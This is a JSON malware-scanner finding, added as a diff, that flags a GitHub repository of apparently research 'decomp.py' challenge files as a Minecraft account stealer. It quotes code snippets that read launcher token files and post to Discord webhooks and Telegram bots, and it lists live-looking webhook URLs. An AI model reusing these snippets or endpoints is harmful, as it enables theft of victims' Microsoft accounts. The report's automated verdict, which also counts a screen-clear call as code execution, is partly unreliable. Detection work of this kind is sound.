@@ -1,0 +1,192 @@
+{
+  "finding": {
+    "key": "repository:syssec-utd/ccs25-walkingthelastmile-supplementary",
+    "kind": "repository",
+    "id": "syssec-utd/ccs25-walkingthelastmile-supplementary",
+    "url": "https://github.com/syssec-utd/CCS25-WalkingTheLastMile-Supplementary",
+    "registry": "github",
+    "owner": "syssec-utd",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 21,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_access/mc-launcher-accounts; network_exfil/discord-webhook; network_exfil/telegram-bot; code_execution/py-system",
+    "evidence_locations": "challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py:372; challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py:25; challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py:690; challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py:50; challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py:495; challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py:27; challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py:570; challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py:26; challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py:880; challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py:1443; challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py:831; challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py:1088; challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py:635; challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py:49; challenges/efa9841572f6210c602ef8813204ae59302299710202cc5666b0b71d8af7785d/decomp.py:891; challenges/efa9841572f6210c602ef8813204ae59302299710202cc5666b0b71d8af7785d/decomp.py:959; challenges/e08c657b19ce3e3fb6b64422699b0b87f75ccf5213581d93b8670a1101f1e6d4/decomp.py:6; challenges/e08c657b19ce3e3fb6b64422699b0b87f75ccf5213581d93b8670a1101f1e6d4/decomp.py:95",
+    "c2_hosts": "discord.com; raw.githubuserc; api.telegram.org; raw.githubu",
+    "iocs": "discord.com; raw.githubuserc; api.telegram.org; https://discord.com/api/webhooks/985849060227428362/62Kk2EFagn67oXkVgPN2DHpwUWOe6DtVwjBkcthzTRVTY6gP3ZhKJyw814luDcL7g2Az; https://discord.com/api/webhooks/993835588178427985/4UOAoRkkyCIAFvUq1k6STeeUeBK9rcKgiFlTI_NURizNIK1b6ZNpGAKaiVRsZgHd3jKB; https://raw.githubuserc; https://discord.com/api/webhooks/1272726031375270040/wkmDvn8uJi8bl3xqFThgn3a5-YWANkC95kz3iAT8TTLDdcvUsNumnHv8D9-9Wlp1NqYi; https://discord.com/api/webhooks/1324996526941933670/wJAJIJKTfct9q0P7S8afqYHUcHFChEqi6ZfkJ7k_vTaLlmG4eu7nrM2pmTuorgwl-12R; https://api.telegram.org/bot%s/%s; https://api.telegram.org/bot{tg_creds}/sendMessage?chat_id={channel_id}; https://discord.com/api/webhooks/1060400470562197544/hC5cXJ0ndKtvU4_rwb1M8AWpfzg8tIm_iZKtwVHDTmQsnr3lOnVvO4lmO0DK_CNRIIos; https://api.telegram.org/bot{bot_token}/sendPhoto; https://api.telegram.org/bot{bot_token}/sendDocument; https://discord.com/api/webhooks/1253788460213338244/5bvlpTW0RJb_OF42mP74Ic3wRFXiP81n9g08sSSNrSZJHNLe8GsFAYQOs9tFCH2ZAgf6; challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py",
+    "matched_signatures": "\"launcher_accounts.json\" \"api/webhooks\"",
+    "reasons": "Shares a confirmed-malware code signature ['\"launcher_accounts.json\" \"api/webhooks\"'] | Tier-2 confirmed (bash score 21)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/syssec-utd_ccs25-walkingthelastmile-supplementary.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py",
+      "line": 372,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "self.accounts_path = '\\\\.minecraft\\\\launcher_accounts.json'"
+    },
+    {
+      "file": "challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py",
+      "line": 25,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__WEBHOOK__ = 'https://discord.com/api/webhooks/985849060227428362/62Kk2EFagn67oXkVgPN2DHpwUWOe6DtVwjBkcthzTRVTY6gP3ZhKJyw814luDcL7g2Az'"
+    },
+    {
+      "file": "challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py",
+      "line": 690,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "files_toget = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']"
+    },
+    {
+      "file": "challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py",
+      "line": 50,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__config__ = {'yourwebhookurl': 'https://discord.com/api/webhooks/993835588178427985/4UOAoRkkyCIAFvUq1k6STeeUeBK9rcKgiFlTI_NURizNIK1b6ZNpGAKaiVRsZgHd3jKB', 'bc_injection_url': 'https://raw.githubuserc"
+    },
+    {
+      "file": "challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py",
+      "line": 495,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "self.accounts_path = '\\\\.minecraft\\\\launcher_accounts.json'"
+    },
+    {
+      "file": "challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py",
+      "line": 27,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1272726031375270040/wkmDvn8uJi8bl3xqFThgn3a5-YWANkC95kz3iAT8TTLDdcvUsNumnHv8D9-9Wlp1NqYi', 'ping': False, 'pingtype': 'Here', 'error': False,"
+    },
+    {
+      "file": "challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py",
+      "line": 570,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']"
+    },
+    {
+      "file": "challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py",
+      "line": 26,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "config = {'webhook': 'https://discord.com/api/webhooks/1324996526941933670/wJAJIJKTfct9q0P7S8afqYHUcHFChEqi6ZfkJ7k_vTaLlmG4eu7nrM2pmTuorgwl-12R', 'persist': False, 'keep-alive': False, 'injection_url'"
+    },
+    {
+      "file": "challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py",
+      "line": 880,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path"
+    },
+    {
+      "file": "challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py",
+      "line": 1443,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)"
+    },
+    {
+      "file": "challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py",
+      "line": 831,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path"
+    },
+    {
+      "file": "challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py",
+      "line": 1088,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "requests.post(f'https://api.telegram.org/bot{tg_creds}/sendMessage?chat_id={channel_id}', data=fields)"
+    },
+    {
+      "file": "challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py",
+      "line": 635,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "tgrb = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']"
+    },
+    {
+      "file": "challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py",
+      "line": 49,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__config__ = {'yourwebhookurl': 'https://discord.com/api/webhooks/1060400470562197544/hC5cXJ0ndKtvU4_rwb1M8AWpfzg8tIm_iZKtwVHDTmQsnr3lOnVvO4lmO0DK_CNRIIos', 'blackcap_inject_url': 'https://raw.githubu"
+    },
+    {
+      "file": "challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py",
+      "line": 26,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "config = {'webhook': 'https://discord.com/api/webhooks/1324996526941933670/wJAJIJKTfct9q0P7S8afqYHUcHFChEqi6ZfkJ7k_vTaLlmG4eu7nrM2pmTuorgwl-12R', 'persist': False, 'keep-alive': False, 'injection_url'"
+    },
+    {
+      "file": "challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py",
+      "line": 570,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']"
+    },
+    {
+      "file": "challenges/efa9841572f6210c602ef8813204ae59302299710202cc5666b0b71d8af7785d/decomp.py",
+      "line": 891,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "telegram_url_G = f'https://api.telegram.org/bot{bot_token}/sendPhoto'"
+    },
+    {
+      "file": "challenges/efa9841572f6210c602ef8813204ae59302299710202cc5666b0b71d8af7785d/decomp.py",
+      "line": 959,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "telegram_url_P = f'https://api.telegram.org/bot{bot_token}/sendDocument'"
+    },
+    {
+      "file": "challenges/e08c657b19ce3e3fb6b64422699b0b87f75ccf5213581d93b8670a1101f1e6d4/decomp.py",
+      "line": 6,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "webhook_url = 'https://discord.com/api/webhooks/1253788460213338244/5bvlpTW0RJb_OF42mP74Ic3wRFXiP81n9g08sSSNrSZJHNLe8GsFAYQOs9tFCH2ZAgf6'"
+    },
+    {
+      "file": "challenges/e08c657b19ce3e3fb6b64422699b0b87f75ccf5213581d93b8670a1101f1e6d4/decomp.py",
+      "line": 95,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('cls')"
+    }
+  ],
+  "commit_sha": "1ae90199f96271991e84ef8a80fe5f91d6535ae6",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py around line 372. The code reads the saved account store of a Minecraft launcher (the vanilla launcher, Lunar Client, Feather Client or the Essential mod). Those files hold refresh and access tokens for the victim's Microsoft account, so copying them lets the attacker sign in as the victim. The same dropper is planted in 7 separate directories in this repository, so it runs whichever of them the victim opens: challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py, challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py, challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py, challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py, challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py, challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py, challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: \"launcher_accounts.json\" \"api/webhooks\".",
+    "payload_description": "The malicious payload sits in challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py at line 372. The code reads the saved account store of a Minecraft launcher (the vanilla launcher, Lunar Client, Feather Client or the Essential mod). Those files hold refresh and access tokens for the victim's Microsoft account, so copying them lets the attacker sign in as the victim. Detection rules that fired in this repository: credential_access/mc-launcher-accounts (7 files), network_exfil/discord-webhook (6 files), network_exfil/telegram-bot (3 files), code_execution/py-system (1 file).",
+    "publisher": "syssec-utd",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "minecraft-account-stealer",
+      "credential-theft"
+    ],
+    "evidence_references": "https://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py#L372\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py#L25\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py#L690\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/b20fc4c46de92b3251445ea8ed5c217fd6149567f0e14227c6c8dc9bc7613357/decomp.py#L50\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py#L495\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/dda5334e8a115616d65d5ecc9989a27dcad15798e8b8ae7e362dda2b82a0826e/decomp.py#L27\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py#L570\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/f68aaa0b2ddafe64527a59d69cf4b5b28fdd4d428c033fc4a45f5b771f773eb7/decomp.py#L26\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py#L880\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/21b78f004676f3f1bc601fbdd98e174ab4e3ec5f21544e0bc1dc5f5cbdead6b0/decomp.py#L1443\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py#L831\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/ccaf75d72b0b864331d565ec11e45cc2c13165d35ec392d8d8a2b899cf7f0c8a/decomp.py#L1088\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py#L635\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/365a951754b9cbbacdaca14d17735e8cae9de3be8f07a1547efd3046965a1324/decomp.py#L49\nhttps://github.com/syssec-utd/ccs25-walkingthelastmile-supplementary/blob/1ae90199f96271991e84ef8a80fe5f91d6535ae6/challenges/efa9841572f6210c602ef8813204ae59302299710202cc5666b0b71d8af7785d/decomp.py#L891",
+    "verified_iocs": "discord.com\nraw.githubuserc\napi.telegram.org\nhttps://discord.com/api/webhooks/985849060227428362/62Kk2EFagn67oXkVgPN2DHpwUWOe6DtVwjBkcthzTRVTY6gP3ZhKJyw814luDcL7g2Az\nhttps://discord.com/api/webhooks/993835588178427985/4UOAoRkkyCIAFvUq1k6STeeUeBK9rcKgiFlTI_NURizNIK1b6ZNpGAKaiVRsZgHd3jKB\nhttps://raw.githubuserc\nhttps://discord.com/api/webhooks/1272726031375270040/wkmDvn8uJi8bl3xqFThgn3a5-YWANkC95kz3iAT8TTLDdcvUsNumnHv8D9-9Wlp1NqYi\nhttps://discord.com/api/webhooks/1324996526941933670/wJAJIJKTfct9q0P7S8afqYHUcHFChEqi6ZfkJ7k_vTaLlmG4eu7nrM2pmTuorgwl-12R\nhttps://api.telegram.org/bot%s/%s\nhttps://api.telegram.org/bot{tg_creds}/sendMessage?chat_id={channel_id}\nhttps://discord.com/api/webhooks/1060400470562197544/hC5cXJ0ndKtvU4_rwb1M8AWpfzg8tIm_iZKtwVHDTmQsnr3lOnVvO4lmO0DK_CNRIIos\nhttps://api.telegram.org/bot{bot_token}/sendPhoto\nhttps://api.telegram.org/bot{bot_token}/sendDocument\nhttps://discord.com/api/webhooks/1253788460213338244/5bvlpTW0RJb_OF42mP74Ic3wRFXiP81n9g08sSSNrSZJHNLe8GsFAYQOs9tFCH2ZAgf6\nchallenges/650db27bdf97fa10ff514c95d70c5987ecdaacdddb1341ed8744d5893f528aef/decomp.py",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
